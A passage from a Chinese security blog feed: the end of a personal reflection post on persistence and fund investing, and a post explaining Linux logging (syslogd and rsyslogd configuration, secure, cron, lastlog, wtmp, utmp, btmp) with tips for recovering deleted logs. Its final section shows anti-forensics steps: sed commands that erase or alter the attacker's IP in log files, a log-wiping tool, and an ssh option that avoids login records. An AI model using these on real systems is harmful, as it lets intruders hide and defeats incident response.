“我的博客已经好久没更新了”，然后就不继续做这个事情，好像这件事就已经熄火了，如果要重启的话，需要好好酝酿一下，攒攒自制力，然后重新开始下一轮高标准的坚持周期，一段时间后往往还是中途放弃。在启动-放弃-酝酿-启动的过程中，积累了大量的负面情绪，也会给自己带来心理暗示：“我就是这么一个无法坚持做事情的人”，到最后真的很难再坚持做一些事情了。</p><p>高标准地要求自己，是好事，但是坚持的概念上面，不妨把标准放得低一些，这反而能让你更好地坚持下来，只要去做了，总比不做强。行百里者半九十，但是很多事情其实可以从九十再开始的。</p><h2 id="理性">理性</h2><p>很容易就能看出来，上面的思考都是很理性的思考。然而这段时间的一些经历让我深刻体会到，理性是有局限性的。</p><blockquote><p>第一，我们很难纯理性地去思考事情，因为我们是有情绪的。</p></blockquote><p>我在大学期间接触了余额宝，它本质上是货币型基金；还有股票型基金，我记得买的是国泰互联网+：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210902162351.png!blog#width-zoom5" /></p><p>当过一波小韭菜后（其实本金就几百块钱），对这种钱生钱的玩意有点着迷。</p><p>所以在拿到第一份工资开始，我就开始着手学习如何理财：先了解一下基金的各种基础知识，再到诸如定投这种买的策略、右侧止盈这种卖的策略，再看大 V 的实盘与复盘来观察、模仿他们的投资思路，最后到实盘根据情况完善自己的投资策略。然后发现自己入了一个深坑，科学投资需要的知识面相当广阔（大众情绪、国家政策、经济发展、国际政治 等等）。最后我把所有的策略都量化成了具体的操作方案，然后看着 Excel 上林林总总数字，我只要无脑执行设定的操作即可，觉得我有足够的理性去应对风险与波动。</p><p>但回顾这两年的投资经历，我干过追涨杀跌的事、接过急速下落的飞刀、还有一次得到靠谱的“内部”消息（其实确实靠谱）后，买股票被深套 3 个月。<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210902162539.png!blog#width-zoom4" /></p><p>虽然最后因为坚持不割肉所以还是赚到钱了，但从那以后我就明白所谓的理性有时候真的不堪一击（以及投资需谨慎啊）。</p><p>如果你没有买过基金，又想体验一把理智失控的感觉，那么我强烈推荐你去买，诺安成长混合。在急速下跌或者疯狂上涨的时候你就可以体会到情绪是可以轻易打败理智的。</p><p>买诺安成长混合，与诺安一同成长。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210902162511.png!blog#width-zoom3" /></p><blockquote><p>第二，不是所有事情都适合理性分析。</p></blockquote><p>理性一直推进，注定会触达感性所无法接受的边界。</p><p>无法接受就会变成矛盾，进而引发争执。</p><p>如果你谈过恋爱，应该会对此深有体会，不多说了。</p><blockquote><p>第三，过于理性的人，容易散失生活的乐趣。</p></blockquote><p>如果我们变成了一个生活的旁观者，永远站在局外去观察自己，观察别人，那么大部分的热情都放在了分析生活，而不是体验生活，也就很难从生活中获得乐趣。我曾经很喜欢把是否意义当做我要不要去做一件事的标准，后来醒悟到，去做一件事，不一定需要它有什么意义，很多时候对它感兴趣这一个理由就已经足够了。</p><h2 id="新的开始">新的开始</h2><p>这篇也可以说是写给未来的我看的，每当一个阶段结束之后，我总想留下些文字，记录一下我的感受，我的思考。</p><p>好了胡扯了这么多，希望对橘友们有点帮助吧，在接下来这段时间我总算可以好好休息一下了。</p><p>回顾这两年的经历，感慨颇多。至少我可以对得起在工作满一周年时说过的这番话了：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210902160714.png!blog#width-zoom5" /></p><p>一路走来遇到不少挫折与磨难，很感谢小伙伴们的鼓励与帮助。<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210903113701.png!blog#width-zoom5" /></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210903113656.png!blog#width-zoom3" /></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210903113650.png!blog#width-zoom5" /></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/一程山路/20210903113644.png!blog#width-zoom2" /></p><p>前方迷雾茫茫，他们的经历激励着我大胆地往前走，去寻找属于我们各自的光明。</p><br><p style="text-align: center;"><font size="2px" color="gray">深不绝涓泉，稚子浴其渊<br>高不绝丘陵，跛羊游其巅<br>我叫游羊<br>我们更高处见</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;潺潺流水终于穿过了群山一座座&lt;/p&gt;</summary>
    
    
    
    <category term="思考启发" scheme="https://www.tr0y.wang/categories/%E6%80%9D%E8%80%83%E5%90%AF%E5%8F%91/"/>
    
    
    <category term="总结" scheme="https://www.tr0y.wang/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="计划" scheme="https://www.tr0y.wang/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>Linux 系统日志小结</title>
    <link href="https://www.tr0y.wang/2021/06/15/linux-system-log/"/>
    <id>https://www.tr0y.wang/2021/06/15/linux-system-log/</id>
    <published>2021-06-15T10:27:44.000Z</published>
    <updated>2023-05-04T09:44:57.356Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 系统日志小结，内附清理工具 LLC</p><span id="more"></span><h1 id="linux-系统日志小结">Linux 系统日志小结</h1><p>上周近距离观赏了一次 APT 组织的攻击，感受最深的是他们非常有组织，搞办公网和搞生产网的人属于不同的组；有纪律，与攻击目标无关的机器能不动就不动，用到的技术其实大家都会，能不能管好自己的手不乱动是比较难的。不过让我比较惊讶的是，所有被入侵的机器的日志都被清除了（好在这些机器都在云上，厂商有对在云服务器上执行的命令做日志），只有一台机器（恰好还是本地机房）的 lastlog 没有清除，这让我十分不解。如果没有这台机器的 lastlog，那么在梳理攻击的链条时就会在中间断掉，无法准确还原入侵的路线，所以学会给自己擦屁股还是很重要的。</p><p>我本来以为自己对 Linux 的系统日志这个知识点十拿九稳，在翘着二郎腿欣赏的过程中突然发现自己不能准确回答 lastlog 的用途，只有一个模糊的印象（虽然猜对了），之前似乎确实没有完整地过一遍，有点不爽，故有此文。</p><h2 id="日志服务">日志服务</h2><h3 id="syslogd">syslogd</h3><blockquote><p>介绍</p></blockquote><p>说到 Linux 的日志，就不得不提到 <code>syslogd</code>。它是大部分 Linux 发行版默认的日志守护进程，是一个记录日志的服务，子配置文件位于 <code>/etc/syslog</code> 或 <code>/etc/syslogd</code>，默认配置文件为 <code>/etc/syslog.conf</code>。从架构来看，这个服务下面有一系列的子服务，例如 mail、cron 等等，这些子服务对外提供日志记录的功能，当其它的程序或服务需要记录日志的时候，就可以直接调用这些子服务将日志记录到指定的地方。</p><p>我们编写的代码可以通过 syslog 的接口进行 log，syslog 会通过 socket 将 log 发送给 syslogd，syslogd 在获取到 log 后，会对 log 进行处理，然后根据用户配置，将 log 保存到本地或者发送到其他服务器上去。</p><p>最简单的，用 <code>logger -t '[test]' "I'm Tr0y"</code> 就可以直接日志记录到 message 里：<br /><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Jun</span>  <span class="hljs-number">9</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>:<span class="hljs-number">52</span> localhost<span class="hljs-meta"> [test]: I&#x27;m Tr0y</span><br></code></pre></td></tr></table></figure></p><p>再举个 python 使用 syslog 的例子吧：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">import</span> syslog<br><br>In [<span class="hljs-number">2</span>]: syslog.openlog(<span class="hljs-string">&#x27;[test]&#x27;</span>)<br><br>In [<span class="hljs-number">3</span>]: syslog.syslog(<span class="hljs-string">&quot;I&#x27;m Tr0y&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>然后就可以在 <code>/var/log/messages</code> 里面看到它了：<br /><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Jun</span>  <span class="hljs-number">9</span> <span class="hljs-number">20</span>:<span class="hljs-number">01</span>:<span class="hljs-number">05</span> localhost<span class="hljs-meta"> [test]: I&#x27;m Tr0y</span><br></code></pre></td></tr></table></figure></p><blockquote><p>配置文件详解</p></blockquote><p>作为 syslogd 的配置文件，<code>syslog.conf</code> 指定了：</p><ol type="1"><li>什么服务？</li><li>什么日志等级？</li><li>记录在哪里？</li></ol><p>格式如下：<br /><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">服务名称+条件运算符+信息等级    日志保存的位置<br></code></pre></td></tr></table></figure></p><p>具体来说：</p><ol type="1"><li>服务名称<ol type="1"><li>user：默认值</li><li>auth/authpriv：主要是与认证有关的服务的日志，例如 login、ssh、su 等</li><li>cron：定时任务的日志，包括 cron 和 at</li><li>kern：即 kernel（用户进程是无法生成这种日志的）</li><li><code>*</code>：代表任意服务</li><li>...</li></ol>举例来说， sendmail 与 postfix 都会通过 syslog 记录日志，服务名称为 LOG_MAIL，所以它们产生的日志在 syslogd 看来就都是 mail 类型的。</li><li>条件运算符<ol type="1"><li><code>.</code>：即 <code>&gt;=</code>，大于等于该等级的日志都要记录下来</li><li><code>.=</code>：即 <code>==</code>，等于该等级的日志都要记录下来</li><li><code>.!</code>：即 <code>!=</code>，除了该等级的日志都要记录下来</li></ol></li><li>信息等级<ol type="1"><li>debug：debug 级别的日志，一般用于调试</li><li>info：仅是一些基本的信息说明</li><li>notice：有些信息需要强调一下</li><li>warning：警示，可能会出问题。这个层级以及以下的，基本无需处理，知道就行。</li><li>err：错误信息，导致程序/系统无法运行</li><li>crit：出现了很严重的错误</li><li>alert：出现了非常严重的错误，必须马上解决</li><li>emerg：系统已经无法使用了</li><li>none：无优先级</li><li><code>*</code>：任意优先级</li></ol></li><li>日志保存的位置：通常是保存在本地文件里。当然也可以选择发送给指定的日志服务器保存。</li></ol><p>最后还有 2 点需要注意：</p><ol type="1"><li>多个服务，不同等级，要共用记录位置的话，可以用 <code>;</code> 来合并：<br /><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 表示 auth 的和 cron 的全部等级的日志都记录在 important 里</span><br><span class="hljs-comment"># 然后再存一份它们 warn 等级的日志在 important.warn 里</span><br><br>auth.*;cron.*　　　　　      <span class="hljs-regexp">/var/</span>log/important<br>auth.=warn;cron.=warn　  <span class="hljs-regexp">/var/</span>log/important.warn<br></code></pre></td></tr></table></figure></li><li>多个服务，共用等级的话，可以用 <code>,</code> 来合并：<br /><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 表示所有日志都存在 messages 里</span><br><span class="hljs-comment"># 然后通过设定 auth、cron 的日志等级为 none 来阻止它们记录日志</span><br><br>*.*;auth,cron.<span class="hljs-literal">none</span>      /var/<span class="hljs-built_in">log</span>/messages<br><br><span class="hljs-comment"># 当然这样也是可以的</span><br>*.*;auth.<span class="hljs-literal">none</span>;cron.<span class="hljs-literal">none</span>　/var/<span class="hljs-built_in">log</span>/messages<br></code></pre></td></tr></table></figure></li></ol><h3 id="rsyslogd">rsyslogd</h3><p>目前不少的 Linux 发行版已经用 rsyslogd 代替了 syslogd。rsyslogd 是 syslogd 的升级版，子配置文件位于 <code>/etc/rsyslog.d</code>，默认配置文件为 <code>/etc/rsyslog.conf</code>，由于其配置语法与 syslogd 的配置文件一致，这里就不重复说了。</p><p>那么在说各个具体的系统日志之前，我们先来看看 rsyslogd 的配置。因为有些系统日志是通过 rsyslogd 记录的，那么正如前面说的，rsyslog.conf 就决定了这些系统日志存放的位置。</p><p>如果你在网上搜索 “linux ssh 日志位置”，很大概率会告诉你是 <code>/var/log/secure</code>。但是这个其实是默认位置，是有可能被改掉的（不同发行版或者是恶意修改）。所以不管是应急也好，做威胁检测也好，最好要通过 rsyslog.conf 来确定特定系统日志真正的位置。</p><p>比如这是我虚拟机的配置：<br /><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">...</span><br><br><span class="hljs-comment">#### RULES ####</span><br><br><span class="hljs-string">...</span><br><br><span class="hljs-comment"># Log anything (except mail) of level info or higher.</span><br><span class="hljs-comment"># Don&#x27;t log private authentication messages!</span><br>*<span class="hljs-string">.info</span>;mail.none;authpriv.none;cron.none                <span class="hljs-string">/var/log/messages</span><br><br><span class="hljs-comment"># The authpriv file has restricted access.</span><br>authpriv.*                                              <span class="hljs-string">/var/log/secure</span><br><br><span class="hljs-string">...</span><br><br><span class="hljs-comment"># Log cron stuff</span><br>cron.*                                                  <span class="hljs-string">/var/log/cron</span><br><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure></p><p>这下我们才可以确定，messages 存放了除了 mail、authpriv、cron 之外所有的 info 等级的日志（所以这个日志文件通常是比较大的）；authpriv 存在 secure 里；cron 存在 cron 里。</p><p>最后有两个小经验：</p><ol type="1"><li>如果攻击者把这类日志删除了的话，那么只要 rsyslogd 进程没有停止过（重启也算停止过），就可以从 <code>/proc/pid/fd/n</code>（pid 和 n 取决于实际情况）恢复日志。步骤非常简单，先用 <code>sudo lsof +L1</code> 看一下有没有被删除的 log 文件，有的话记下 pid，然后 <code>ls -l /proc/pid/fd</code> 找一下日志文件是对应的哪个 fd，直接 cp 即可</li><li>如果用 vim 打开了通过 rsyslogd 记录的日志的文件之后，执行了保存操作（打开后直接 wq 也算），那么该日志会立即停止记录。回想一下 vim 的 wq 原理，其实就是 cp+mv，cp 不用说，会创建一个新的 inode；mv 的文件在同一个分区下时，执行的其实是 rename；这一套流程下来，在 <code>/proc/pid/fd/n</code> 下面的表现就是后面多了一个 <code>(deleted)</code>（这里面的机制有些复杂，不仅仅是 inode 那么简单的，有机会的话详细介绍）。如果要恢复中断的记录，那么就需要从 <code>/proc/pid/fd/n</code> 下面 cp 出来，然后重启 rsyslogd；如果不想找回中断的记录，那么直接重启就行。</li></ol><h2 id="重要系统日志">重要系统日志</h2><h3 id="messages">messages</h3><p>默认路径：<code>/var/log/messages</code></p><p>它是默认的日志文件，记录 Linux 内核消息及各种应用程序的日志信息，包括：启动、IO 错误、网络错误、程序自定义日志等等。</p><p>虽然信息种类会多一些，但是这个一般用得少，就不多说了。</p><h3 id="secure">secure</h3><p>默认路径：<code>/var/log/secure</code></p><p>只要牵涉到需要输入帐号密码的程序，包括 login、有图形界面的 Linux 登录的时候、su、sudo、ssh、telnet、groupadd、useradd、passwd 等等，那么当登录时（不管成功或者失败）都会被记录在此。</p><p>secure 是应急响应中最常查看的文件，例如疑似存在 ssh 爆破的时候，我们就可以查看这个文件，这类应急基本上是在考验我们使用 grep、awk、sed 的熟练度。</p><h3 id="cron">cron</h3><p>默认路径：<code>/var/log/cron</code></p><p>该日志文件记录了 cron 运行的日志。包含：</p><ol type="1"><li>crontab 运行定时任务的记录，包含运行的命令、时间、pid、定时任务所属的用户等</li><li>更新定时任务（关键字 REPLACE/RELOAD）的时间点与用户</li><li>如果定时任务有直接输出的话，也会打到 cron 里去</li></ol><p>cron 的作用比较专一，它一般有两种用途：</p><ol type="1"><li>cron 误删之后，可以根据日志直接恢复命令；至于定时任务的调度周期，可以尝试根据定时任务通过每次执行的间隔来尝试还原。</li><li>如果 crontab 被植入了恶意的定时任务，那么在这里可以找到植入后第一次运行的时间，结合调度周期，可以推断出被植入的时间范围。</li></ol><h3 id="登录相关日志">登录相关日志</h3><p>先来看一下整体的流程。</p><p>在 Linux 中，每当有一个用户登录时，如果有分配 tty，login 命令要负责：</p><ol type="1"><li>在文件 lastlog 中查看用户的 UID，如果存在，则把用户上次登录、注销的时间和主机名写到标准输出中</li><li>然后在 lastlog 日志中记录新的登录时间</li><li>接着在 utmp 日志中记录用户新的登陆记录</li><li>接着在 wtmp 日志中记录用户新的登陆记录</li><li>当用户登录退出时</li><li>在 wtmp 日志中记录用户新的注销记录</li><li>最后在 utmp 日志中删除该用户对应的登陆记录</li></ol><p>接下来详细看一下每个日志的用途，这些日志都是二进制格式的日志，用 cat、less 是看不了的。btmp、utmp 和 wtmp，它们的数据结构是一样的，而 lastlog 文件有自己的数据结构，关于它们的具体的数据结构可以使用 man 命令查询，例如 <code>man utmp</code>。</p><h4 id="lastlog">lastlog</h4><p>默认路径：<code>/var/log/lastlog</code></p><p>该日志文件记录了每个用户最近一次成功的登录事件和最后一次不成功的登录事件，每次用户登录的时候都会查一下这个日志的记录。</p><p>一般用 <code>lastlog</code> 命令查看，会根据 UID 排序来显示用户名、tty、IP 和最后登录时间，如果某用户从来没有登录过，就显示为 <code>**Never logged in**</code>：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610163125.png!blog" /></p><h4 id="wtmp">wtmp</h4><p>默认路径：<code>/var/log/wtmp</code></p><p>该日志文件记录了每个用户登录、注销及系统的重启等事件，主要用于查看用户的登录记录。</p><p>一般用 <code>last</code> 命令查看，会以反序从后向前显示用户的登录记录，也能根据用户名、tty 或时间显示相应的记录：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610162505.png!blog" /></p><h4 id="utmp">utmp</h4><p>默认路径：<code>/var/run/utmp</code></p><p>该日志文件记录了当前登录的每个用户的信息。因此这个文件会随着用户登录、注销而不断变化，因为它只保留了当前已登录的用户记录，不会为用户保留永久的记录。</p><p>系统中需要查询当前用户状态的程序，如 who、w、users、finger 等其实就是从这个文件获取的信息：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610163049.png!blog" /></p><h4 id="btmp">btmp</h4><p>默认路径：<code>/var/log/btmp</code></p><p>该日志文件记录了失败的登录尝试。默认没有初始化，不会记录，可以执行一次 <code>lastb</code> 开始记录。</p><p>一般用 <code>lastb</code> 命令查看：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610163320.png!blog" /></p><h2 id="清理痕迹">清理痕迹</h2><blockquote><p>清空日志</p></blockquote><p>简单粗暴，但是很容易被发现，除非已经到了收割成果的阶段，被不被发现都无所谓了，那么可以这么做。需要注意的是，清空有两种做法，一种是用空字符串覆盖原文件，这种没什么问题；另一种是直接将文件删除，对于用 rsyslogd 记录的日志来说，如果没有停过 rsyslogd 那么是可以被恢复到，这一点上面也提到过了。</p><blockquote><p>修改日志</p></blockquote><p>对于用 rsyslogd 记录的日志来说，可读性很好，直接修改即可。</p><p>比如篡改自己使用的 ip：<code>sed -i 's/192.168.166.85/192.168.1.1/g' secure</code>；或者直接删掉有 ip 信息的行 <code>sed -i '/192.168.166.85/d' test</code>。</p><p>稍微有些费劲是那些二进制格式的日志。对于登录相关日志来说，由于手动修改比较麻烦，所以我写了一个日志清理的工具：</p><p>https://github.com/Macr0phag3/LLC</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610163540.png!blog#width-zoom5" /></p><p>以 utmp 为例：</p><p>用 w 我们可以看到 macr0phag3 在线：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610164049.png!blog" /></p><p>清除：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610164203.png!blog#width-zoom7" /></p><p>再用 w 看看：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610164229.png!blog" /></p><p>macr0phag3 就没有显示在线了。</p><p>如果觉得这样麻烦，其实也有办法避免记录登录日志。登录后，在分配伪 tty（建议看下资料 1）的时候才会出现这些登录日志（btmp 除外），那如果没有分配的话，就不会做记录，这也是这个命令的原理：<br /><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh -T user@host <span class="hljs-regexp">/bin/</span>bash -i<br></code></pre></td></tr></table></figure><br /><code>-T</code> 代表不要分配 tty，<code>-i</code> 代表要一个交互型的 bash，去掉其实也能用，甚至整个 <code>/bin/bash -i</code> 都可以去掉，就是不太美观，用起来不爽。</p><p>比如我们可以创建一个新的用户来试试，用上述方式登录：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/linux-system-log/20210610180402.png!blog" /></p><p>可以看到除了爆破失败的记录之外，其他登录日志均无记录。</p><p>当然了，隐藏/清理痕迹的手法有很多，有各种姿势，像这种 ssh 的算烂大街了。等有时间我专门写一篇文章来总结这些知识。</p><p><br></p><p>日志在应急中是非常重要的。现在很多运维在突发事故上吃了亏，都会对日志做备份，甚至有专门的日志备份服务器，但是基本上是出于运维角度的考虑。其实安全事件也算突发事故，如果意识到了日志对于应急响应的作用，应该会有更多人做备份吧。当然如果有实时备份的话，攻击者直接清理日志就没啥用了，但是可以想办法让日志停止记录。</p><p>攻与防，始终是相互促进的嘛</p><h2 id="资料">资料</h2><ul><li>Linux TTY/PTS 概述: https://segmentfault.com/a/1190000009082089</li></ul><br><p style="text-align: center;"><font size="2px" color="gray">如果橘友们是这个 APT 组织的成员<br>会记得清理日志吗？<br>会漏掉那个关键的 lastlog 吗？</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Linux 系统日志小结，内附清理工具 LLC&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Linux" scheme="https://www.tr0y.wang/tags/Linux/"/>
    
  </entry>
  
</feed>
